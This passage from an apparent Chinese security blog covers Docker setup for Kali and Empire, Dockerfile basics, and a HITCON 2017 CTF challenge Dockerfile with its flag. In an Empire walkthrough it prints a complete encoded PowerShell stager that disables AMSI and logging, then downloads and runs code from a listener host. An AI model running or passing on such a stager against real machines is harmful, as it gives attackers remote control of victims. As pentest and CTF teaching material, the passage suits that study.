class="line">23e91a40cb124720b1dba81371a275169124cbff2778120b4350470fa79a0d91</div><div class="line">➜  ~ docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                    NAMES</div><div class="line">23e91a40cb12        kalilinux:v0.2      <span class="string">"/bin/bash"</span>         12 seconds ago      Up 11 seconds       0.0.0.0:5000-&gt;5000/tcp   boring_volhard</div><div class="line">➜  ~ docker attach boring_volhard</div><div class="line">root@23e91a40cb12:/<span class="comment"># cd home/Empire/</span></div><div class="line">root@23e91a40cb12:/home/Empire<span class="comment"># ls</span></div><div class="line">LICENSE  README.md  changelog  data  empire  lib  setup</div><div class="line">root@23e91a40cb12:/home/Empire<span class="comment">#</span></div></pre></td></tr></table></figure><h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><h4 id="Dockerfile基本语句的说明"><a href="#Dockerfile基本语句的说明" class="headerlink" title="Dockerfile基本语句的说明"></a>Dockerfile基本语句的说明</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">FROM</span> &lt;image:版本标签&gt;：该 image 文件继承某个镜像 image，冒号表示标签，这里标签是<span class="number">8.4</span>，即<span class="number">8.4</span>版本的 node。</div><div class="line"></div><div class="line"><span class="keyword">MAINTAINER</span> &lt;name&gt; &lt;email&gt; :描述镜像的创建者，名称和邮箱</div><div class="line"></div><div class="line"><span class="keyword">COPY</span><span class="bash"> .[directory]：将当前目录下的所有文件（除了.dockerignore排除的路径），都拷贝进入 image 文件的 directory 目录。</span></div><div class="line"></div><div class="line"><span class="keyword">ADD</span><span class="bash">  源路径 目标路径 :将主机构建环境（上下文）目录中的文件和目录、以及一个URL标记的文件 拷贝到镜像中。与COPY相比ADD可以自动解压，也可以复制网络文件。路径不存在会自动创建。</span></div><div class="line"></div><div class="line"><span class="keyword">WORKDIR</span><span class="bash"> [directory]：指定接下来的工作路径为 directory。</span></div><div class="line"></div><div class="line"><span class="keyword">RUN</span><span class="bash"> [cmd]：在/app目录下，运行[cmd]命令安装依赖。注意，安装后所有的依赖，都将打包进入 image 文件。</span></div><div class="line"></div><div class="line"><span class="keyword">EXPOSE</span> [port]：将容器 port 端口暴露出来， 允许外部连接这个端口。在docker <span class="keyword">run</span><span class="bash"> -p的时候生效。</span></div><div class="line"></div><div class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">"path"</span>] : 在主机上创建一个挂载，挂载到容器的指定路径。docker run -v命令也能完成这个操作，而且更强大。这个命令不能指定主机的需要挂载到容器的文件夹路径。但docker run -v可以，而且其还可以挂载数据容器。</span></div><div class="line"></div><div class="line"><span class="keyword">CMD</span><span class="bash"> [cmd]：在容器启动后自动执行 [cmd] 命令(只会出现一次)</span></div><div class="line"></div><div class="line">EVN &lt;key&gt; &lt;value&gt; : 只能设置一个，设置容器的环境变量，可以让其后面的<span class="keyword">RUN</span><span class="bash">命令使用，容器运行的时候这个变量也会保留。</span></div></pre></td></tr></table></figure><h4 id="CTF中的Dockerfile实例展示"><a href="#CTF中的Dockerfile实例展示" class="headerlink" title="CTF中的Dockerfile实例展示"></a>CTF中的Dockerfile实例展示</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#Hitcon 2017 web baby^h-master-php-2017</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment">#read_secret输出OrangeOrangeOrange</span></div><div class="line"><span class="comment">#MaxConnectionsPerChild为100</span></div><div class="line"><span class="comment">#其余环境与题目大致无异</span></div><div class="line"><span class="comment">#如要修改root与题目用户密码请用 [docker exec -it '你的应用名称' /bin/bash] 进入容器修改</span></div><div class="line"></div><div class="line"><span class="comment">#整合 apache php7</span></div><div class="line"><span class="keyword">FROM</span> pr0ph3t/lap7</div><div class="line"><span class="keyword">MAINTAINER</span> Pr0ph3t &lt;<span class="number">1415314884</span>@qq.com&gt;</div><div class="line"></div><div class="line"><span class="comment">#Install crontab and perl with LWP</span></div><div class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update -y &amp;&amp; apt-get install cron -y</span></div><div class="line"></div><div class="line"><span class="comment">#Init crontab , 每天凌晨4点清空data文件夹</span></div><div class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'0 4 * * * root rm -rf /var/www/data/*'</span> &gt;&gt; /etc/crontab</span></div><div class="line"></div><div class="line"><span class="comment">#Init challenge</span></div><div class="line"><span class="keyword">ADD</span><span class="bash"> index.php /var/www/html/</span></div><div class="line"><span class="keyword">ADD</span><span class="bash"> readflag /read_flag</span></div><div class="line"><span class="keyword">ADD</span><span class="bash"> read_secret /read_secret</span></div><div class="line"><span class="keyword">ADD</span><span class="bash"> avatar-1.gif /var/www/html/avatar.gif</span></div><div class="line"></div><div class="line"><span class="keyword">RUN</span><span class="bash"> chmod u+s /read_flag</span></div><div class="line"><span class="keyword">RUN</span><span class="bash"> rm -rf /var/www/html/index.html</span></div><div class="line"><span class="keyword">RUN</span><span class="bash"> mkdir /var/www/data</span></div><div class="line"><span class="keyword">RUN</span><span class="bash"> chown www-data /var/www/data</span></div><div class="line"><span class="keyword">RUN</span><span class="bash"> chmod -R 775 /var/www/data</span></div><div class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'hitcon&#123;Th3 d4rk fl4m3 PHP Mast3r&#125;'</span> &gt; /flag</span></div><div class="line"><span class="keyword">RUN</span><span class="bash"> chmod 700 /flag</span></div><div class="line"></div><div class="line"><span class="comment">#Configure the apache2</span></div><div class="line"><span class="keyword">RUN</span><span class="bash"> sed <span class="string">'s/Indexes //'</span> /etc/apache2/apache2.conf &gt; /etc/apache2/apache2.conf.new</span></div><div class="line"><span class="keyword">RUN</span><span class="bash"> sed <span class="string">'s/MaxConnectionsPerChild   0/MaxConnectionsPerChild   100/'</span> /etc/apache2/mods-available/mpm_prefork.conf &gt; /etc/apache2/mods-available/mpm_prefork.conf.new</span></div><div class="line"><span class="keyword">RUN</span><span class="bash"> mv /etc/apache2/apache2.conf.new /etc/apache2/apache2.conf</span></div><div class="line"><span class="keyword">RUN</span><span class="bash"> mv /etc/apache2/mods-available/mpm_prefork.conf.new /etc/apache2/mods-available/mpm_prefork.conf</span></div><div class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'&lt;Directory "/var/www/data"&gt;\n\tphp_flag engine off\n&lt;/Directory&gt;'</span> &gt;&gt; /etc/apache2/sites-enabled/000-default.conf</span></div><div class="line"></div><div class="line"><span class="comment">#Create run.sh</span></div><div class="line"><span class="keyword">ADD</span><span class="bash"> run.sh /</span></div><div class="line"><span class="keyword">RUN</span><span class="bash"> chmod +x /run.sh</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#Expose http service</span></div><div class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></div><div class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"bash -x /run.sh"</span>]</span></div></pre></td></tr></table></figure><h4 id="Dockerfile的使用方式"><a href="#Dockerfile的使用方式" class="headerlink" title="Dockerfile的使用方式"></a>Dockerfile的使用方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">进入Dockerfile目录</div><div class="line">[docker build -t &apos;自定义镜像名字&apos; . ] //最后的.别少了</div><div class="line">[docker run -id --name &apos;你的应用名称&apos; -p 外部端口:80 -m &apos;内存限制 如1g、500m&apos; &apos;你的自定义镜像名称&apos; /run.sh]</div></pre></td></tr></table></figure><h3 id="附例"><a href="#附例" class="headerlink" title="附例"></a>附例</h3><p>在vps中的docker上使用empire进行渗透测试(metasploit同理)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#端口映射参考上条</span></div><div class="line">================================================================</div><div class="line"> [Empire]  Post-Exploitation Framework</div><div class="line">================================================================</div><div class="line"> [Version] 2.3 | [Web] https://github.com/empireProject/Empire</div><div class="line">================================================================</div><div class="line"></div><div class="line">   _______ .___  ___. .______    __  .______       _______</div><div class="line">  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|</div><div class="line">  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__</div><div class="line">  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|</div><div class="line">  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____</div><div class="line">  |_______||__|  |__| | _|      |__| | _| `._____||_______|</div><div class="line"></div><div class="line"></div><div class="line">       282 modules currently loaded</div><div class="line"></div><div class="line">       0 listeners currently active</div><div class="line"></div><div class="line">       0 agents currently active</div><div class="line"></div><div class="line"></div><div class="line">(Empire) &gt; <span class="built_in">help</span></div><div class="line"></div><div class="line">Commands</div><div class="line">========</div><div class="line">agents            Jump to the Agents menu.</div><div class="line">creds             Add/display credentials to/from the database.</div><div class="line"><span class="built_in">exit</span>              Exit Empire</div><div class="line"><span class="built_in">help</span>              Displays the <span class="built_in">help</span> menu.</div><div class="line">interact          Interact with a particular agent.</div><div class="line">list              Lists active agents or listeners.</div><div class="line">listeners         Interact with active listeners.</div><div class="line">load              Loads Empire modules from a non-standard folder.</div><div class="line">preobfuscate      Preobfuscate PowerShell module_source files</div><div class="line">reload            Reload one (or all) Empire modules.</div><div class="line">reset             Reset a global option (e.g. IP whitelists).</div><div class="line">resource          Read and execute a list of Empire commands from a file.</div><div class="line">searchmodule      Search Empire module names/descriptions.</div><div class="line"><span class="built_in">set</span>               Set a global option (e.g. IP whitelists).</div><div class="line">show              Show a global option (e.g. IP whitelists).</div><div class="line">usemodule         Use an Empire module.</div><div class="line">usestager         Use an Empire stager.</div><div class="line"></div><div class="line">(Empire) &gt; list</div><div class="line">(Empire) &gt; listeners</div><div class="line">[!] No listeners currently active</div><div class="line">(Empire: listeners) &gt; uselistener http</div><div class="line">(Empire: listeners/http) &gt; info</div><div class="line"></div><div class="line">    Name: HTTP[S]</div><div class="line">Category: client_server</div><div class="line"></div><div class="line">Authors:</div><div class="line">  @harmj0y</div><div class="line"></div><div class="line">Description:</div><div class="line">  Starts a http[s] listener (PowerShell or Python) that uses a</div><div class="line">  GET/POST approach.</div><div class="line"></div><div class="line">HTTP[S] Options:</div><div class="line"></div><div class="line">  Name              Required    Value                            Description</div><div class="line">  ----              --------    -------                          -----------</div><div class="line">  SlackToken        False                                        Your SlackBot API token to communicate with your Slack instance.</div><div class="line">  ProxyCreds        False       default                          Proxy credentials ([domain\]username:password) to use <span class="keyword">for</span> request (default, none, or other).</div><div class="line">  KillDate          False                                        Date <span class="keyword">for</span> the listener to <span class="built_in">exit</span> (MM/dd/yyyy).</div><div class="line">  Name              True        http                             Name <span class="keyword">for</span> the listener.</div><div class="line">  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.</div><div class="line">  DefaultDelay      True        5                                Agent delay/reach back interval (<span class="keyword">in</span> seconds).</div><div class="line">  DefaultLostLimit  True        60                               Number of missed checkins before exiting</div><div class="line">  WorkingHours      False                                        Hours <span class="keyword">for</span> the agent to operate (09:00-17:00).</div><div class="line">  SlackChannel      False       <span class="comment">#general                         The Slack channel or DM that notifications will be sent to.</span></div><div class="line">  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile <span class="keyword">for</span> the agent.</div><div class="line">                                process.php|Mozilla/5.0 (Windows</div><div class="line">                                NT 6.1; WOW64; Trident/7.0;</div><div class="line">                                rv:11.0) like Gecko</div><div class="line">  Host              True        http://172.17.0.2:80             Hostname/IP <span class="keyword">for</span> staging.</div><div class="line">  CertPath          False                                        Certificate path <span class="keyword">for</span> https listeners.</div><div class="line">  DefaultJitter     True        0.0                              Jitter <span class="keyword">in</span> agent reachback interval (0.0-1.0).</div><div class="line">  Proxy             False       default                          Proxy to use <span class="keyword">for</span> request (default, none, or other).</div><div class="line">  UserAgent         False       default                          User-agent string to use <span class="keyword">for</span> the staging request (default, none, or other).</div><div class="line">  StagingKey        True        3ab47284cf7e260541d810beb54d3405 Staging key <span class="keyword">for</span> initial agent negotiation.</div><div class="line">  BindIP            True        0.0.0.0                          The IP to <span class="built_in">bind</span> to on the control server.</div><div class="line">  Port              True        80                               Port <span class="keyword">for</span> the listener.</div><div class="line">  ServerVersion     True        Microsoft-IIS/7.5                Server header <span class="keyword">for</span> the control server.</div><div class="line">  StagerURI         False                                        URI <span class="keyword">for</span> the stager. Must use /download/. Example: /download/stager.php</div><div class="line"></div><div class="line"></div><div class="line">(Empire: listeners/http) &gt; <span class="built_in">set</span> Name docker</div><div class="line"><span class="comment">#此处的172.16.188.1为vps的ip地址</span></div><div class="line">(Empire: listeners/http) &gt; <span class="built_in">set</span> Host http://172.16.188.1:5000</div><div class="line">(Empire: listeners/http) &gt; execute</div><div class="line">[*] Starting listener <span class="string">'docker'</span></div><div class="line">[+] Listener successfully started!</div><div class="line">(Empire: listeners/http) &gt; lsit</div><div class="line">*** Unknown syntax: lsit</div><div class="line">(Empire: listeners/http) &gt; back</div><div class="line">(Empire: listeners) &gt; list</div><div class="line"></div><div class="line">[*] Active listeners:</div><div class="line"></div><div class="line">  Name              Module          Host                                 Delay/Jitter   KillDate</div><div class="line">  ----              ------          ----                                 ------------   --------</div><div class="line">  docker            http            http://172.16.188.1:5000             5/0.0</div><div class="line"></div><div class="line">(Empire: listeners) &gt; usestager</div><div class="line">multi/bash                osx/dylib                 osx/teensy                windows/launcher_sct</div><div class="line">multi/launcher            osx/jar                   windows/bunny             windows/launcher_vbs</div><div class="line">multi/pyinstaller         osx/launcher              windows/dll               windows/macro</div><div class="line">multi/war                 osx/macho                 windows/ducky             windows/macroless_msword</div><div class="line">osx/applescript           osx/macro                 windows/hta               windows/teensy</div><div class="line">osx/application           osx/pkg                   windows/launcher_bat</div><div class="line">osx/ducky                 osx/safari_launcher       windows/launcher_lnk</div><div class="line">(Empire: listeners) &gt; usestager windows/d</div><div class="line">dll    ducky</div><div class="line">(Empire: listeners) &gt; usestager windows/dll</div><div class="line">(Empire: stager/windows/dll) &gt; info</div><div class="line"></div><div class="line">Name: DLL Launcher</div><div class="line"></div><div class="line">Description:</div><div class="line">  Generate a PowerPick Reflective DLL to inject with</div><div class="line">  stager code.</div><div class="line"></div><div class="line">Options:</div><div class="line"></div><div class="line">  Name             Required    Value             Description</div><div class="line">  ----             --------    -------           -----------</div><div class="line">  Listener         True                          Listener to use.</div><div class="line">  ProxyCreds       False       default           Proxy credentials</div><div class="line">                                                 ([domain\]username:password) to use <span class="keyword">for</span></div><div class="line">                                                 request (default, none, or other).</div><div class="line">  Obfuscate        False       False             Switch. Obfuscate the launcher</div><div class="line">                                                 powershell code, uses the</div><div class="line">                                                 ObfuscateCommand <span class="keyword">for</span> obfuscation types.</div><div class="line">                                                 For powershell only.</div><div class="line">  Proxy            False       default           Proxy to use <span class="keyword">for</span> request (default, none,</div><div class="line">                                                 or other).</div><div class="line">  Language         True        powershell        Language of the stager to generate.</div><div class="line">  OutFile          True        /tmp/launcher.dll File to output dll to.</div><div class="line">  UserAgent        False       default           User-agent string to use <span class="keyword">for</span> the staging</div><div class="line">                                                 request (default, none, or other).</div><div class="line">  Arch             True        x64               Architecture of the .dll to generate</div><div class="line">                                                 (x64 or x86).</div><div class="line">  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation <span class="built_in">command</span> to use.</div><div class="line">                                                 Only used <span class="keyword">if</span> Obfuscate switch is True.</div><div class="line">                                                 For powershell only.</div><div class="line">  StagerRetries    False       0                 Times <span class="keyword">for</span> the stager to retry</div><div class="line">                                                 connecting.</div><div class="line"></div><div class="line"></div><div class="line">(Empire: stager/windows/dll) &gt; <span class="built_in">set</span> Listener docker</div><div class="line">(Empire: stager/windows/dll) &gt; back</div><div class="line">(Empire: listeners) &gt; launcher powershell docker</div><div class="line">powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAcwBpAE8A<span class="built_in">bg</span>BUAEEAYgBMAEUALgBQAFMAVgBFAHIAcwBJAE8ATgAuAE0AQQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAAUwA9AFsAUgBFAGYAXQAuAEEAcwBzAEUATQBCAGwAWQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAEkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBFAFQAVgBBAGwAdQBlACgAJABOAFUAbABsACkAOwBJAGYAKAAkAEcAUABTAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkA<span class="built_in">bg</span>BnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAA7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkA<span class="built_in">bg</span>BnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkA<span class="built_in">bg</span>B2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0ARQBMAHMAZQB7AFsAUwBDAHIAaQBQAFQAQgBsAG8AYwBrAF0ALgAiAEcARQBUAEYASQBFAGAAbABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbAB1AEUAKAAkAG4AVQBsAGwALAAoAE4AZQBXAC0ATwBCAGoAZQBDAFQAIABDAG8ATABsAEUAYwBUAGkAbwBOAHMALgBHAEUATgBlAFIAaQBDAC4ASABBAHMASABTAEUAVABbAFMAdAByAEkA<span class="built_in">bg</span>BHAF0AKQApAH0AWwBSAEUAZgBdAC4AQQBzAFMARQBtAEIATAB5AC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEA<span class="built_in">bg</span>BhAGcAZQBtAGUA<span class="built_in">bg</span>B0AC4AQQB1AHQAbwBtAGEAdABpAG8A<span class="built_in">bg</span>AuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8A<span class="built_in">bg</span>BQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQA<span class="built_in">bg</span>B1AGwAbAAsACQAVABSAHUAZQApAH0AOwB9ADsAWwBTAFkAcwB0AEUAbQAuAE4ARQB0AC4AUwBFAFIAdgBpAEMAZQBQAG8ASQBOAFQATQBBAG4AYQBnAEUAcgBdADoAOgBFAFgAcABlAEMAVAAxADAAMABDAE8A<span class="built_in">bg</span>B0AGkA<span class="built_in">bg</span>BVAEUAPQAwADsAJAB3AEMAPQBOAGUAVwAtAE8AQgBqAGUAQwB0ACAAUwB5AFMAVABlAE0ALgBOAGUAVAAuAFcARQBiAEMATABJAEUA<span class="built_in">bg</span>BUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUA<span class="built_in">bg</span>B0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAdwBDAC4ASABFAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUA<span class="built_in">bg</span>B0ACcALAAkAHUAKQA7ACQAVwBjAC4AUAByAE8AWABZAD0AWwBTAFkAUwB0AGUAbQAuAE4AZQB0AC4AVwBFAGIAUgBFAFEAVQBlAFMAVABdADoAOgBEAEUAZgBBAHUAbABUAFcAZQBCAFAAcgBPAFgAeQA7ACQAdwBDAC4AUABSAG8AWABZAC4AQwByAGUAZABFAG4AdABpAGEATABzACAAPQAgAFsAUwBZAFMAdABlAE0ALgBOAGUAVAAuAEMAcgBlAGQAZQBuAFQASQBhAGwAQwBhAGMASABlAF0AOgA6AEQAZQBGAGEAVQBMAFQATgBFAFQAVwBvAHIASwBDAHIAZQBEAEUATgB0AEkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUATQAuAFQAZQB4AFQALgBFAE4AQwBPAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgBZAFQAZQBTACgAJwAzAGEAYgA0ADcAMgA4ADQAYwBmADcAZQAyADYAMAA1ADQAMQBkADgAMQAwAGIAZQBiADUANABkADMANAAwADUAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBnAFMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOAA4AC4AMQA6ADUAMAAwADAAJwA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAVwBjAC4ASABFAEEAZABlAHIAUwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AUgAvAGoAMwAxAEkAYwBRAGQAZQAzAEYANwB2AGoAWABYADIA<span class="built_in">bg</span>BwADYARQAyAFcAcQBiAGMAPQAiACkAOwAkAEQAYQBUAEEAPQAkAFcAQwAuAEQAbwBXAE4AbABvAEEARABEAGEAVABBACgAJABzAEUAcgArACQAdAApADsAJABpAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQB0AGEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAGUATgBHAHQASABdADsALQBKAE8AaQBuAFsAQwBIAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==</div><div class="line"><span class="comment">#在目标机器上执行上面的payload就可以得到下面的反弹</span></div><div class="line">(Empire: listeners) &gt; [+] Initial agent G3BYNCLW from 172.17.0.1 now active (Slack)</div></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>EIS 2017 DNS101题解</title>
      <link href="/2017/11/02/EIS-2017-MISC%E9%A2%98%E8%A7%A3/"/>
      <url>/2017/11/02/EIS-2017-MISC%E9%A2%98%E8%A7%A3/</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天跟大佬们在做EIS 2017运维挑战赛，我看的时候大佬们已经把web做的差不多了。所以我就来解决两道MISC。</p><h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><p>第一个是rc4的一个解密，挺简单的，手撸一个解密代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment">#密文：下面十六进制的一串；密钥：hello world</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4</span><span class="params">(data,key)</span>:</span></div><div class="line">  j=<span class="number">0</span></div><div class="line">  s=range(<span class="number">256</span>)</div><div class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</div><div class="line">    j=(j+s[i]+ord(key[i%len(key)]))%<span class="number">256</span></div><div class="line">    s[i],s[j]=s[j],s[i]</div><div class="line">  i=<span class="number">0</span></div><div class="line">  j=<span class="number">0</span></div><div class="line">  out=[]</div><div class="line">  <span class="keyword">for</span> char <span class="keyword">in</span> data:</div><div class="line">    i=(i+<span class="number">1</span>)%<span 